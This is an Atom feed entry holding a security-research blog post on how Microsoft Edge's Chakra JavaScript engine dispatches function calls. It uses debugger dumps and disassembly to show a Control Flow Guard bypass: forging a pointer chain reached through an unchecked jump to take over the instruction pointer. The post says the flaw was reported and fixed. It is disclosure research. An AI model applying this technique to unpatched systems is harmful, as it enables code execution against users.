<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Hexo]]></title>
  
  <link href="/en/atom.xml" rel="self"/>
  <link href="http://xlab.tencent.com/en/"/>
  <updated>2016-01-04T05:36:54.000Z</updated>
  <id>http://xlab.tencent.com/en/</id>
  
  <author>
    <name><![CDATA[John Doe]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Use Chakra engine again to bypass CFG]]></title>
    <link href="http://xlab.tencent.com/en/2016/01/04/use-chakra-engine-again-to-bypass-cfg/"/>
    <id>http://xlab.tencent.com/en/2016/01/04/use-chakra-engine-again-to-bypass-cfg/</id>
    <published>2016-01-03T16:00:00.000Z</published>
    <updated>2016-01-04T05:36:54.000Z</updated>
    <content type="html"><![CDATA[<p>This post is initially inspired by a talk with @<a href="https://twitter.com/tombkeeper" target="_blank" rel="external">TK</a>, during which I learned the process and detail on how to successfully bypass CFG (reference: use Chakra JIT to bypass DEP and CFG). Due to my interest in its technology, I spent some time reading related materials and found another position to bypass CFG. I would like to thanks @<a href="https://twitter.com/tombkeeper" target="_blank" rel="external">TK</a> for enlightening me on the ideas and techniques mentioned in this post.</p>
<p>There are plenty of articles that focus on the analysis of CFG, if you are interested, you may refer to my previous speech on HitCon 2015(<a href="https://github.com/exp-sky/HitCon-2015-spartan-0day-exploit/blob/master/Spartan%200day%20%26%20Exploit-m.pdf" target="_blank" rel="external">《spartan 0day &amp; exploit》</a>). To be clear, this post is the part that is not revealed in my speech. At this point, the method to implement arbitrary code execution on edge through a write to memory is completely revealed.<br><a id="more"></a></p>
<h2 id="0x01_the_function_calling_logic_of_Chakra">0x01 the function calling logic of Chakra</h2><p>When the chakra engine calls a function, it will conduct different process based on different function status, for example, the function called first time, the function called multi-times, DOM interface function an the function compiled by jit. Different types of functions have different processing flow, but all processing will be achieved by the Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt; function through calling the Js::JavascriptFunction::CallFunction<1> function.</1></js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></p>
<h3 id="1-the_first_call_and_the_multiple_calls_of_a_function">1.the first call and the multiple calls of a function</h3><p>When the following script is called, the function Js::JavascriptFunction::CallFunction<1> will be called by Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt;.</js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></1></p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span><span class="comment">&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="title">test</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure>
<p>If the function is called for the first time, the execution flow will be:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:DeferredParsingThunk</span></span><br><span class="line">			|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:DeferredParse</span></span><br><span class="line">			|-chakra!<span class="constant">NativeCodeGenerator:</span><span class="symbol">:CheckCodeGenThunk</span></span><br><span class="line">				|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:DelayDynamicInterpreterThunk</span></span><br><span class="line">					|-jmp_code</span><br><span class="line">						|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:InterpreterThunk</span></span><br></pre></td></tr></table></figure>
<p>If the function is called again, the calling process will be:</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!<span class="constant">NativeCodeGenerator:</span><span class="symbol">:CheckCodeGenThunk</span></span><br><span class="line">			|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:DelayDynamicInterpreterThunk</span></span><br><span class="line">				|-jmp_code</span><br><span class="line">					|-chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:InterpreterThunk</span></span><br></pre></td></tr></table></figure>
<p>These two calling flows are almost identical. The mainly difference is when the function is called the first time, it has to use the DeferredParsingThunk function to resolve it. This design is for high efficiency. But the subsequent call will directly execute it.</p>
<p>By analysis, the sub function called by Js::JavascriptFunction::CallFunction<1> is obtained through the data in the Js::ScriptFunction object. The functions called subsequently Js::JavascriptFunction::DeferredParsingThunk and NativeCodeGenerator::CheckCodeGenThunk are both included in the Js::ScriptFunction object. Here are the differences of Js::ScriptFunction in two different calls.</1></p>
<p>The object Js::ScriptFunction called the first time:</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06eaf050 )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06eaf050 </span><br><span class="line">06eaf050  <span class="number">5f695580</span> 06eaf<span class="number">080 00000</span><span class="number">000 00000</span>000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06eaf050+4) </span><br><span class="line">06eaf080  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">26c00 06e1</span>fea0</span><br><span class="line">06eaf090  5f8db<span class="number">3f0 00000</span>000 5fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06eaf050+4)+0x10)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptFunction<span class="number">::Defe</span>rredParsingThunk:</span><br></pre></td></tr></table></figure>
<p>The object Js::ScriptFunction called the second time:</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06eaf050 )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06eaf050 </span><br><span class="line">06eaf050  <span class="number">5f695580</span> 1ce<span class="number">1a0c0 00</span><span class="number">000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06eaf050+4)</span><br><span class="line">1ce1a0c0  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">26c00 06e1</span>fea0</span><br><span class="line">1ce1a0d0  5f8db<span class="number">9e0 00000</span>000 5fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06eaf050+4)+0x10)</span><br><span class="line">chakra!NativeCodeGenerator<span class="number">::C</span>heckCodeGenThunk:</span><br></pre></td></tr></table></figure>
<p>So the differences between the first call and the subsequent calls are achieved by changing the function pointer in the Js::ScriptFunction object.</p>
<h3 id="2-jit_of_the_function">2.jit of the function</h3><p>Next we’ll look at the jit of the function. Here is the script code for test, which triggers its jit through multiple calling the test1 function.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">test1</span><span class="params">(num)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> num + <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//trigger jit</span></span><br><span class="line"></span><br><span class="line">test1(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>The Js::ScriptFunction object that goes through jit.</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">//new debug, the memory address of the object will be different</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(<span class="number">07103050</span> )</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">07103050</span> </span><br><span class="line"><span class="number">07103050</span>  <span class="number">5f695580</span> <span class="number">1d7280c0</span> <span class="number">00000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(<span class="number">07103050+4</span>)</span><br><span class="line"><span class="number">1d7280c0</span>  <span class="number">00000012 00</span><span class="number">000000 07</span><span class="number">076c00 07</span>1080a0</span><br><span class="line"><span class="number">1d7280d0</span>  <span class="number">0a510600</span> <span class="number">00000000 5</span>fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(<span class="number">07103050+4</span>)+0x10)			//jit code</span><br><span class="line"><span class="number">0a510600</span> 55              push    ebp</span><br><span class="line"><span class="number">0a510601</span> 8bec            mov     ebp,esp</span><br><span class="line"><span class="number">0a510603</span> 81fc5cc9d005    cmp     esp,5D0C95Ch</span><br><span class="line"><span class="number">0a510609</span> 7f21            jg      <span class="number">0a51062</span>c</span><br><span class="line"><span class="number">0a51060</span>b 6a00            push    0</span><br><span class="line"><span class="number">0a51060</span>d 6a00            push    0</span><br><span class="line"><span class="number">0a51060</span>f <span class="number">68d0121b04</span>      push    41B12D0h</span><br><span class="line"><span class="number">0a510614</span> <span class="number">685c09000</span>0      push    95Ch</span><br><span class="line"><span class="number">0a510619</span> e<span class="number">802955b55</span>      call    chakra!ThreadContext<span class="number">::</span>ProbeCurrentStack2 (5fac9b20)</span><br><span class="line"><span class="number">0a51061</span>e <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a510622</span> <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a510626</span> <span class="number">0f1f4000</span>        nop     dword ptr [eax]</span><br><span class="line"><span class="number">0a51062</span>a 6690            xchg    ax,ax</span><br><span class="line"><span class="number">0a51062</span>c 6a00            push    0</span><br><span class="line"><span class="number">0a51062</span>e 8d6424ec        lea     esp,[esp-14h]</span><br><span class="line"><span class="number">0a510632</span> 56              push    esi</span><br><span class="line"><span class="number">0a510633</span> 53              push    ebx</span><br><span class="line"><span class="number">0a510634</span> b<span class="number">8488e0607</span>      mov     eax,7068E48h</span><br><span class="line"><span class="number">0a510639</span> 8038ff          cmp     byte ptr [eax],0FFh</span><br><span class="line"><span class="number">0a51063</span>c 7402            je      <span class="number">0a510640</span></span><br><span class="line"><span class="number">0a51063</span>e fe00            inc     byte ptr [eax]</span><br><span class="line"><span class="number">0a510640</span> 8b450c          mov     eax,dword ptr [ebp+0Ch]</span><br><span class="line"><span class="number">0a510643</span> 25ffffff08      and     eax,8FFFFFFh</span><br><span class="line"><span class="number">0a510648</span> 0fbaf01b        btr     eax,1Bh</span><br><span class="line"><span class="number">0a51064</span>c 83d802          sbb     eax,2</span><br><span class="line"><span class="number">0a51064</span>f 7c2f            jl      <span class="number">0a510680</span></span><br><span class="line"><span class="number">0a510651</span> 8b5d14          mov     ebx,dword ptr [ebp+14h] //ebx = num</span><br><span class="line"><span class="number">0a510654</span> 8bc3            mov     eax,ebx		//eax = num (num &lt;&lt; 1 &amp; 1)</span><br><span class="line"><span class="number">0a510656</span> d1f8            sar     eax,1			//eax = num &gt;&gt; 1</span><br><span class="line"><span class="number">0a510658</span> 732f            jae     <span class="number">0a510689</span></span><br><span class="line"><span class="number">0a51065</span>a 8bf0            mov     esi,eax</span><br><span class="line"><span class="number">0a51065</span>c 8bc6            mov     eax,esi</span><br><span class="line"><span class="number">0a51065</span>e 40              inc     eax			//num + 1</span><br><span class="line"><span class="number">0a51065</span>f 7040            jo      <span class="number">0a5106a1</span></span><br><span class="line"><span class="number">0a510661</span> 8bc8            mov     ecx,eax</span><br><span class="line"><span class="number">0a510663</span> 83c102          add     ecx,2			//num + 2</span><br><span class="line"><span class="number">0a510666</span> 7045            jo      0a5106ad</span><br><span class="line"><span class="number">0a510668</span> 8bc1            mov     eax,ecx</span><br><span class="line"><span class="number">0a51066</span>a 83c003          add     eax,3			//num + 3</span><br><span class="line"><span class="number">0a51066</span>d 704a            jo      <span class="number">0a5106b9</span></span><br><span class="line"><span class="number">0a51066</span>f 8bc8            mov     ecx,eax</span><br><span class="line"><span class="number">0a510671</span> d1e1            shl     ecx,1			//ecx = num &lt;&lt; 1</span><br><span class="line"><span class="number">0a510673</span> 7050            jo      <span class="number">0a5106c5</span></span><br><span class="line"><span class="number">0a510675</span> 41              inc     ecx			//ecx = num += 1</span><br><span class="line"><span class="number">0a510676</span> 8bd9            mov     ebx,ecx</span><br><span class="line"><span class="number">0a510678</span> 8bc3            mov     eax,ebx</span><br><span class="line"><span class="number">0a51067</span>a 5b              pop     ebx</span><br><span class="line"><span class="number">0a51067</span>b 5e              pop     esi</span><br><span class="line"><span class="number">0a51067</span>c 8be5            mov     esp,ebp</span><br><span class="line"><span class="number">0a51067</span>e 5d              pop     ebp</span><br><span class="line"><span class="number">0a51067</span>f c3              ret</span><br></pre></td></tr></table></figure>
<p>The pointer to NativeCodeGenerator::CheckCodeGenThunk in the Js::ScriptFunction object is changed to a pointer to jit code after jit. The implementation directly called the jit code.</p>
<p>Simply speaking, when the called function passes it parameters, it first rotates one bit left, and pass the values after the lowest bit 1（parameter = (num &lt;&lt; 1) &amp; 1）. So the first thing to do after getting the parameter is to rotate one bit right to get the original parameter value. As for why, I suppose it’s caused by the garbage collection mechanism of the script engine, which separates object and data by the lowest bit.</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chakra!<span class="constant">Js:</span><span class="symbol">:InterpreterStackFrame</span><span class="symbol">:</span><span class="symbol">:OP_CallCommon&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutDynamicProfile&lt;Js</span><span class="symbol">:</span><span class="symbol">:OpLayoutT_CallI&lt;Js</span><span class="symbol">:</span><span class="symbol">:LayoutSizePolicy&lt;</span><span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!<span class="constant">Js:</span><span class="symbol">:JavascriptFunction</span><span class="symbol">:</span><span class="symbol">:CallFunction&lt;</span><span class="number">1</span>&gt;</span><br><span class="line">		|-jit code</span><br></pre></td></tr></table></figure>
<p>When calling the jit function, the calling stack is as the above, this is the method that chakra engine uses to call the jit function.</p>
<h3 id="3-DOM_interface_function">3.DOM interface function</h3><p>To cover everything, there is another kind of function to mention, that’s DOM interface function, a function provided by other engines, such as the rendering engine (theoretically it can be other engines as will).</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br></pre></td></tr></table></figure>
<p>On execution, the above script will use the following function calling process, until call the engine that provides the interface function.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chakra!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;<span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!Js::JavascriptFunction::CallFunction&lt;<span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk <span class="comment">//call dom interface function</span></span><br><span class="line">			|-dom_interface_function	<span class="comment">//EDGEHTML!CFastDOM::CDocument::Trampoline_createElement</span></span><br></pre></td></tr></table></figure>
<p>When calling the interface function, the Js::InterpreterStackFrame::OP_CallCommon<js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0> &gt; &gt; &gt; function and the function object used in the subsequent process differ from the ones used previously, it is the Js::JavascriptExternalFunction object. Then similar to the previosfunction call, it also resolves the function pointer in their subject and calls it; finally it enters the wanted DOM interface function.</js::oplayoutdynamicprofile<js::oplayoutt_calli<js::layoutsizepolicy<0></p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(06f2cea0)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptExternalFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 06f2cea0 </span><br><span class="line">06f2cea0  <span class="number">5f696c4</span>c <span class="number">06e6f7a0</span> <span class="number">00000000 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd poi(06f2cea0+4)</span><br><span class="line"><span class="number">06e6f7a0</span>  <span class="number">00000012 00</span><span class="number">000000 06</span>e<span class="number">76c00 06f04</span>0a0</span><br><span class="line"><span class="number">06e6f7b0</span>  <span class="number">5f8c6130</span> <span class="number">00000000 5</span>fb<span class="number">0b454 00</span>000101</span><br><span class="line"></span><br><span class="line">0:010&gt; u poi(poi(06f2cea0+4)+0x10)</span><br><span class="line">chakra!Js<span class="number">::</span>JavascriptExternalFunction<span class="number">::E</span>xternalFunctionThunk:</span><br></pre></td></tr></table></figure>
<p>These are the different call methods that chakra engine uses to call different types of functions.</p>
<h2 id="0x02_Exploit_and_Exploitation">0x02 Exploit and Exploitation</h2><p>After describing the call methods for all sorts of chakra engines, now we’ll check out the very important cog vulnerability. As mentioned above, the first calling process differs from the sub sequent ones. Let’s look at the logic here; the following is the call stack:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//the first call</span></span><br><span class="line">chakra!Js::InterpreterStackFrame::OP_CallCommon&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;<span class="number">0</span>&gt; &gt; &gt; &gt;</span><br><span class="line">	|-chakra!Js::JavascriptFunction::CallFunction&lt;<span class="number">1</span>&gt;</span><br><span class="line">		|-chakra!Js::JavascriptFunction::DeferredParsingThunk</span><br><span class="line">			|-chakra!Js::JavascriptFunction::DeferredParse    <span class="comment">//obtain NativeCodeGenerator::CheckCodeGenThunk function</span></span><br><span class="line">			|-chakra!NativeCodeGenerator::CheckCodeGenThunk</span><br><span class="line">				|-chakra!Js::InterpreterStackFrame::DelayDynamicInterpreterThunk</span><br><span class="line">					|-jmp_code	</span><br><span class="line">						|-chakra!Js::InterpreterStackFrame::InterpreterThunk</span><br></pre></td></tr></table></figure>
<p>What is not mentioned above is the Js::JavascriptFunction::DeferredParse function in the above process. Function resolution related work is conducted in this function, and this function returns the pointer value of NativeCodeGenerator::CheckCodeGenThunk, then returns Js::JavascriptFunction::DeferredParsingThunk and calls it. The pointer of NativeCodeGenerator::CheckCodeGenThunk is also obtained through resolving the Js::JavascriptFunction object. Here is the code.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl Js::JavascriptFunction::DeferredParsingThunk(<span class="keyword">struct</span> Js::ScriptFunction *p_script_function)</span><br><span class="line">&#123;</span><br><span class="line">  NativeCodeGenerator_CheckCodeGenThunk = Js::JavascriptFunction::DeferredParse(&amp;p_script_function);</span><br><span class="line">  <span class="keyword">return</span> NativeCodeGenerator_CheckCodeGenThunk();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F0</span> <span class="tag">push</span>    <span class="tag">ebp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F1</span> <span class="tag">mov</span>     <span class="tag">ebp</span>, <span class="tag">esp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F3</span> <span class="tag">lea</span>     <span class="tag">eax</span>, <span class="attr_selector">[esp+p_script_function]</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F7</span> <span class="tag">push</span>    <span class="tag">eax</span>             ; <span class="tag">struct</span> <span class="tag">Js</span><span class="pseudo">::ScriptFunction</span> **</span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3F8</span> <span class="tag">call</span>    <span class="tag">Js</span><span class="pseudo">::JavascriptFunction</span><span class="pseudo">::DeferredParse</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3FD</span> <span class="tag">pop</span>     <span class="tag">ebp</span></span><br><span class="line"><span class="class">.text</span><span class="pseudo">:002AB3FE</span> <span class="tag">jmp</span>     <span class="tag">eax</span></span><br></pre></td></tr></table></figure>
<p>On this jump position, no CFG check is made on the function pointer in eax. Therefore, this can be used to hijack the eip. But first you need to know how the function pointer NativeCodeGenerator::CheckCodeGenThunk returned by the Js::JavascriptFunction::DeferredParse function is resolved through the Js::ScriptFunction object. Here is the resolution process.</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; u poi(070af050)</span><br><span class="line">chakra!Js<span class="number">::</span>ScriptFunction<span class="number">::</span>`vftable':</span><br><span class="line"></span><br><span class="line">0:010&gt; dd 070af050 + 14</span><br><span class="line">070af064  <span class="number">076690e0</span> 5fb11ef<span class="number">4 00000000</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">076690e0</span> + 10</span><br><span class="line"><span class="number">076690f0</span>  <span class="number">076690e0</span> <span class="number">04186628 07</span><span class="number">065f90 00</span>000000</span><br><span class="line"></span><br><span class="line">0:010&gt; dd <span class="number">076690e0</span> + 28</span><br><span class="line"><span class="number">07669108</span>  07010dc<span class="number">0 000001</span>a<span class="number">8 00000035</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">0:010&gt; dd 07010dc0 </span><br><span class="line">07010dc0  <span class="number">5f696000</span> <span class="number">05a452b8</span> <span class="number">00000000 5</span>f8db9e0</span><br><span class="line"></span><br><span class="line">0:010&gt; u 5f8db9e0</span><br><span class="line">chakra!NativeCodeGenerator<span class="number">::C</span>heckCodeGenThunk:</span><br></pre></td></tr></table></figure>
<p>As shown above, Js::JavascriptFunction::DeferredParse gets the NativeCodeGenerator::CheckCodeGenThunk function pointer by resolving the Js::ScriptFunction object, the resolving method is abbreviated as [[[Js::ScriptFunction+14]+10]+28]+0c. So just by forging the data in this memory, it can trigger the call of Js::JavascriptFunction::DeferredParse by calling the function, further to hijack the eip, as shown below.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">010</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="literal">eax</span>=603ba064 <span class="literal">ebx</span>=063fba10 <span class="literal">ecx</span>=063fba40 <span class="literal">edx</span>=063fba40 <span class="literal">esi</span>=<span class="number">00000001</span> <span class="literal">edi</span>=058fc6b0</span><br><span class="line"><span class="literal">eip</span>=603ba064 <span class="literal">esp</span>=058fc414 <span class="literal">ebp</span>=058fc454 iopl=<span class="number">0</span>         nv <span class="preprocessor">up</span> ei ng nz na po cy</span><br><span class="line"><span class="literal">cs</span>=<span class="number">001b</span>  <span class="literal">ss</span>=<span class="number">0023</span>  <span class="literal">ds</span>=<span class="number">0023</span>  <span class="literal">es</span>=<span class="number">0023</span>  <span class="literal">fs</span>=003b  <span class="literal">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">chakra!<span class="string">`dynamic initializer for 'DOMFastPathInfo::getterTable''+0x734:</span><br><span class="line">603ba064 94              xchg    eax,esp</span><br><span class="line">603ba065 c3              ret</span></span><br></pre></td></tr></table></figure>
<p>By this way, cfg is bypassed and eip is hijacked. This method is simple and stable. It’s convenient to use when you get access to read and write the memory. This exploit has been reported to Microsoft on 25th July, 2015.</p>
<h2 id="0x03_Mitigation">0x03 Mitigation</h2><p>Microsoft has fixed all the exploits in this post. The mitigation plan is relatively easy, which is to add cft check at this jump.</p>
